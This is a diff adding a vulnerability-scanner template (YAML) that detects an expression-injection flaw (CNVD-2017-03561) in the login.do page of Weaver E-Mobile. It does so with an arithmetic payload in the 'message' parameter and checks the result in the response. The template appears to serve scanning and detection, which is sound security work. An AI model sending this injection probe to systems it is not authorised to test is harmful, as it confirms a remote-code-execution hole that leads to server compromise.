@@ -1,0 +1,26 @@
+id: CNVD-2017-03561
+
+info:
+  name: 泛微 E-Mobile 表达式注入
+  author: laohuan12138
+  severity: high
+  verified: true
+  description: |
+    e-mobile是泛微为手机、平板电脑等移动终端的移动办公产品。
+    上海泛微网络科技股份有限公司e-mobile平台login.do页面存在表达式注入漏洞。允许攻击者远程执行命令，获得服务器权限。
+    app="泛微-EMobile"
+  reference:
+  - https://gitee.com/cute-guy/Penetration_Testing_POC/blob/master/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5.md
+  - https://zhuanlan.zhihu.com/p/26052235
+
+set:
+  numa: randomInt(1000, 5000)
+  numb: randomInt(5000, 10000)
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: '/login.do?message={{numa}}*{{numb}}'
+    expression: response.status == 200 && response.body.bcontains(bytes(string(numa * numb)))
+expression: r0()
